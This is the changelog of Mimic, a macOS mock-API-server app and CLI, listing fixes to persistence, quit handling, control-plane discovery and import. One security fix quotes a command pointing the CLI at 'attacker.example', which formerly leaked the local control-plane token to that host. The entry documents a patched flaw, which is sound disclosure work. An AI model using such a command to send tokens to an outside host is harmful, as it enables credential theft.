# Changelog

Notable changes per release. Format follows [Keep a Changelog](https://keepachangelog.com/en/1.1.0/);
versions follow [Semantic Versioning](https://semver.org/spec/v2.0.0.html).

## [Unreleased]

### Added

- **`MIMIC_CONTROL_FILE` relocates the control plane's discovery file**, so a CI job or an end-to-end
  script can stand an instance up without writing over — or being discovered through — a developer's
  own `control.json`. The app honours it on both sides: it writes there and searches *only* there,
  because the override replaces the default search list rather than joining the front of it, and the
  parent directory is created `0700` on that path too. `mimic` does not read it yet — it links no
  `ControlPlane` and carries its own copy of the discovery reader — so an isolated run also needs
  `MIMIC_CONTROL_PORT` (or `MIMIC_CONTROL_URL`) for the destination **and `MIMIC_CONTROL_TOKEN` for
  the credential**. The port variables carry a destination and no token, and every route — `/health`
  included — answers `401` without one.

### Fixed

- **Duplicating a project created nothing, unless the project was empty.** `endpoint.id`,
  `scenario.id`, `journey.id` and `journeyStep.id` are each a `PRIMARY KEY` on their own table —
  unique across the database, not scoped to a project — and both hosts built the copy by wrapping a
  fresh project id around the *source's* endpoints, scenarios, journeys and steps, ids included. The
  first insert collided with rows the original still owned, GRDB aborted, and the whole write rolled
  back. It failed silently in both directions: the window treated the throw as non-critical, and the
  window's control host answers `mimic project duplicate` before the store is touched, so the CLI
  exited `0`. `MockProject.duplicated(name:)` in `Domain` now remints every identifier in the tree and
  repoints the two references that aim into it — an endpoint's active scenario, followed by position,
  and the project's active journey, which would otherwise have dangled and silently deactivated. It is
  the only implementation: `mimic endpoint duplicate` and `mimic project duplicate` used to disagree
  about which scenario the copy serves, because the executor pointed a copy at its *first* scenario
  while the other path followed the *active* one.
- **Quitting no longer drops the edit you just made.** Autosave debounces by 500 ms, and both exit
  paths — ⌘Q, and the `SIGTERM` that `mimic app stop` sends — ended the process without writing.
  `mimic endpoint create` followed immediately by `mimic app stop` is two commands well inside that
  window, and a script lost the endpoint the first one had just reported creating; silently, because
  the window that shows "Save failed" is gone by then and the next launch simply reads an older
  project. Both paths now write the open project before they go, bounded at two seconds so a wedged
  store cannot hang the quit, and both drop the discovery file *before* that wait — it is credential
  material, and a flush that runs out its deadline must not leave a live token on disk.
- **Project-lifecycle commands reach the store in the order they were issued.** Create, duplicate and
  delete answer before their write lands — that is what makes the window feel immediate — and each was
  an independent unstructured task with no order between them. `mimic project create Foo` followed by
  `mimic project delete Foo` is two commands inside one database round trip, and the delete could
  reach the store first, remove nothing, and let the create's insert land after it and put the project
  back; `mimic project duplicate Foo` in the same position reported "not found" for a project the
  caller had just been told was created. The writes are chained now, so they land in the order asked
  for whatever order the replies arrive in.
- **A project written by a newer build is refused by name, not reported as missing.** The stored
  document's `schemaVersion` is checked before a single field is read, and one from ahead of this
  build throws `PersistenceError.unsupportedSchemaVersion` naming both numbers — the fields this build
  does not know about are exactly the ones a partial read would drop, and a save afterwards would drop
  them for good. `project list` still shows it: a project you cannot open is still a project you have,
  and hiding it looks exactly like the store having lost it.
- **`mimic app stop` confirms the pid before it signals.** It read a pid out of `control.json` and
  handed it straight to `kill(2)`; a file left behind by a crashed instance names a pid the system may
  since have reused, and the `SIGTERM` went to whoever owns it now. The CLI now asks the instance on
  that file's own port for its state and requires the pid it reports to match. It ignores `--url` for
  the same reason — a pid only means something on the machine the file was read from. A wedged
  instance, or one whose file carries no token, can no longer be stopped this way; the refusal names
  the pid and prints the `kill` to run by hand.
- **A discovered token goes only to the instance that advertised it.** Destination and credential were
  resolved independently, so `mimic state --url http://attacker.example` posted this machine's live
  control-plane token to that host in an `X-Mimic-Token` header. The token from `control.json` is now
  attached only when the URL's host is loopback *and* its port is the one that file advertised.
  Reaching an instance through a forwarded port or from a container means setting
  `MIMIC_CONTROL_TOKEN`, which is the caller naming a credential rather than the CLI guessing one.
- **Two overlapping control-plane starts no longer strand one of them.** `start` suspends twice before
  it records the application it built, and an actor admits another call at each suspension, so both
  callers saw "not running", both bound a port, and the second overwrote the first — which then
  listened for the life of the process, unreachable by `stop` and with its discovery file replaced. A
  start arriving while a stop was still closing had the same shape from the other end, and is now a
  distinct refusal that says to try again rather than one that says a port is in use.
- **The request log shows what was actually sent.** It recorded the *configured* status while the
  server serves a clamped one, so a scenario carrying `0` or `999` served `200` or `599` and the
  traffic list reported `0` or `999` — and it listed response headers that the serving path had
  refused as invalid, so a header containing a CRLF appeared to have been sent when nothing was. The
  log is read precisely because the wire cannot be, which is the worst place for the two to disagree.
- **A project document past 16 KB imports over the control API.** Vapor's default collect limit
  applies per route, and `projectImport` posts a whole `MockProject` with its captured response bodies
  in it — roughly eight endpoints' worth. Past that, the request failed before the handler ran and the
  caller got Vapor's own `413` body instead of a `ControlResponse`, surfacing as an exit-4 `http.413`
  that no error code explains. The command route now collects up to 4 MB.
- **Swagger specs that declare `produces` once, at the document level, import as JSON.** The parser
  read it only from the operation, so those specs — the overwhelming majority — imported as plain
  text, and with no body either, since the plain-text path short-circuits the JSON body fallback.
  Every Swagger fixture in the suite happened to declare `produces` inside the operation, which is why
  two bugs hid behind one convention.
- **A schema change no longer erases your projects.** `AppMigrations.migrator` set GRDB's
  `eraseDatabaseOnSchemaChange` under `#if DEBUG`, and the app applied that migrator to the real
  store in Application Support. Debug is the configuration every developer runs, so the next
  migration added to the project would have dropped and rebuilt everyone's database empty. Erasing is
  now opt-in and honoured only alongside an explicit `MIMIC_DATABASE_PATH`.
- **A journey rehydrated against removed steps no longer takes the app down.** With the default
  `orderedPerEndpoint` match mode, a cursor past the end of the step list built an invalid `Range`,
  which is a trap rather than an error — inside the embedded server, so it ended the process.
- **`mimic` exits 2 for bad usage, as documented.** An unknown subcommand or a missing argument
  exited 64. `--match-mode`, `--completion` and `--unmatched` also silently ignored an unrecognised
  value and reported success; they now fail.
- **The control plane's discovery file is never world-readable.** It was written at the default
  umask and chmodded afterwards, leaving the instance token readable by any local account for the
  length of that window. The CLI also no longer trusts the `baseURL` string inside that file.
- **Refused edits are reported.** Every validation failure raised by a window action was written to
  a field nothing read, so a header containing a newline silently kept the old value.
- **Restarting the control service logs again.** `shutdown()` cancelled the log drain, which finishes
  the shared stream, so a later `start()` served traffic and recorded none of it.
- A locked or unreadable database is no longer reported as "project not found".
- The request log's method badges no longer share one accessibility identifier per HTTP method.
- The sidebar's filter field shows a focus ring. `.textFieldStyle(.plain)` discards AppKit's, and
  nothing replaced it, so tabbing into it changed nothing on screen — which under Full Keyboard
  Access is not a polish item.

### Changed

- Adding a `ControlCommand` case is now a compile error until it is *named and classified* —
  `ControlCommand.kind` and `CommandKind.scope` are switches with no `default` — and a test failure
  until it is *routed*, in the executor and in both hosts. Routing is not compile-enforced: all three
  dispatch switches end in a `default:` that throws at runtime, and sweeps over `CommandKind.allCases`
  are what catch a command nobody implemented. The command catalog is checked against the enum rather
  than against a copy of itself, and every catalog example is parsed by the CLI.
- Endpoint, scenario and step names and paths are trimmed on the way in, as journey names already
  were.
- `Package.resolved` and `Tuist/Package.resolved` are pinned to one set of dependency versions, and
  CI fails if they drift — Linux was testing a Vapor, NIO and GRDB build the installer never shipped.
  The two were reconciled onto Vapor 4.121.3, NIO 2.97.1 and GRDB 7.10.0; twenty-one shared packages
  had diverged.
- Both manifests declare macOS 26, the floor every other artefact already stated.

### Known issues

- **⌘Q waits for the open project's pending edit, but not for a project-lifecycle write still in
  flight.** `create`, `duplicate`, `delete` and `import` answer before the store has the change, and
  only the `SIGTERM` path drains them: it is `async` and suspends, leaving the main actor free to run
  the very writes it is waiting for, while `willTerminate` is posted from inside
  `NSApplication.terminate` with nowhere left to suspend to, so it has to block the main thread — and
  a drain awaited from there is a hop onto an actor nothing can service. Draining from both paths is
  what a first pass at this did, and it deadlocked every quit against its own flush: the full
  two-second deadline burned, then the edit dropped, worse than the defect it was fixing and green in
  CI, because nothing in the suite exercises either quit path. The path that cannot drain now says so
  rather than pretending. The real fix is `applicationShouldTerminate` returning `.terminateLater`,
  which keeps the runloop alive instead of blocking the thread that has to run the work; it changes
  the app's termination contract and wants a machine that can actually quit the app to verify it.

## [0.9.3] — 2026-08-06

### Fixed

- **The request log drawer resizes like the other two panels.** It was the last one still driven by a
  `DragGesture` writing into a frame, which could crash inside AppKit's constraint update with the
  mouse still down; it is an `NSSplitViewItem` now, so hover, double-click and size restoration match
  the navigator and the inspector.
- **The journey editor's header stays reachable** when a journey has more steps than fit.
- A release now fails rather than shipping a version that disagrees with the tag.

## [0.9.2] — 2026-08-04

### Fixed

- **The app no longer rebuilds itself continuously.** Opening a project used to put Mimic into a loop
  that held a full CPU core for as long as the window was open.

  Every evaluation of the app's body constructed a whole new `AppState` — which opens the SQLite
  store, runs the migrations and restores the open project — and then discarded it. Because that
  initialiser reads `currentProject` and then writes it, each pass invalidated the body that was
  still running, so the next pass began immediately. Measured on a running window with nothing
  touching it: about 150 database opens a second, indefinitely. macOS reports it as a CPU limit and
  a disk-write limit, both naming the same stack.

  Everything the window does happens on the main thread, so a main thread that never finishes is a
  window that answers the pointer late or not at all — resizing, dragging a divider, and clicking all
  degrade together. The session is now built once per process.

- **Resizing the request log no longer accumulates.** The panel divider resized from the drag's
  *translation* — a cumulative distance — added to a starting size held in view state. A layout pass
  can re-deliver a drag event, and a re-delivery re-read that starting size from a height the same
  drag had already moved, applying the distance twice and then again. Each round dirtied the window's
  constraints, and AppKit aborts a window that needs more constraint passes than it has views.

  It needed content in the panel to keep the geometry changing, which is why it showed up when the
  request log had traffic in it and not on an empty one.

  The divider now resizes from where the pointer *is*, measured against the panel's attached edge —
  the one edge a resize cannot move. Handling the same event twice produces the same height, so a
  re-delivery is a no-op rather than a step. This is the pattern Apple's guidance gives for a
  drag that affects layout.

### Known issues

- With the sidebar, request log and inspector all open, the window will not resize below roughly
  1560pt wide, because the inspector's current width acts as a floor on the window rather than its
  minimum. Hiding the inspector releases it. Not yet fixed.

## [0.9.1] — 2026-08-04

### Fixed

- **HAR import no longer rewrites response bodies.** A body is now reproduced exactly as captured.

  A redaction pass used to run over imported bodies, and it matched sensitive key names as a
  *substring* — so `author` matched on "auth", `keywords`, `keyboard` and `monkey` on "key", and
  `shipping`, `shopping`, `mapping` and `typing` on "pin". Ordinary fields in ordinary responses came
  back as `[REDACTED]`, which is a majority of real captures rather than an edge case.

  A second defect sat underneath it. The branch handling non-string values quoted its replacement, so
  `"sessionCount": 42` imported as `"sessionCount": "[REDACTED]"` — a number turned into a string,
  which fails to decode in any typed client even when the key really was a secret.

  An importer that edits the payload defeats the point of importing: the mock has to answer what the
  real server answered, or the client under test is being tested against something that never
  happened.

  Unchanged: credential *headers* are still dropped on import, and the request log served over the
  control API still redacts credential header values. [SECURITY.md](SECURITY.md) states plainly what
  a verbatim import now costs — a captured OAuth response lands with the real token in it, and the
  import review sheet is where that is caught.

## [0.9.0] — 2026-08-04

First beta.

Mimic runs local mock API servers on macOS, so client work can start before the backend is ready.
Define endpoints, configure responses, switch scenarios, script journeys, simulate latency and
network failures, and watch live request traffic. The server runs in-process.

Everything the window does is also scriptable. The `mimic` CLI and a loopback HTTP control API expose
the same operations, so a UI test or an agent can create a configuration, script a flow and drive a
run without touching the interface.

### Included

- **Endpoints and scenarios** — path matching with `:param` segments, global and per-endpoint latency,
  and scenarios that switch a whole set of responses at once.
- **Journeys** — ordered response sequences, so the same route can fail and then succeed. Per-step
  status, headers, body, delay and repeat count; transport failures; automatic or held progression;
  many stored, one active. A logged request can be captured straight into a step, so a flow can be
  built by running it once.
- **GraphQL** — requests matched by operation name rather than by path, falling back from the client's
  `operationName` to the name in the document to the first root field.
- **Import** — HAR captures and OpenAPI/Swagger documents become endpoint candidates you review before
  they land. Bodies are reproduced verbatim; credential headers are not replayed.
- **Request log** — live traffic with full request and response detail, formatted and syntax-coloured
  bodies, copy as `curl`, and unmatched requests called out so you can see the mocks you are missing.
- **CLI and control API** — the whole command surface over HTTP, bound to `127.0.0.1` only, with a
  per-instance token, JSON output and meaningful exit codes. Headless mode for CI and agents.

Ships as a signed and notarised installer that puts Mimic.app in `/Applications` and `mimic` in
`/usr/local/bin`.

Beta, and versioned below 1.0 deliberately: the interface and the stored project format may still
change between releases.

[0.9.3]: https://github.com/srpadrono/mimic/releases/tag/v0.9.3
[0.9.2]: https://github.com/srpadrono/mimic/releases/tag/v0.9.2
[0.9.1]: https://github.com/srpadrono/mimic/releases/tag/v0.9.1
[0.9.0]: https://github.com/srpadrono/mimic/releases/tag/v0.9.0
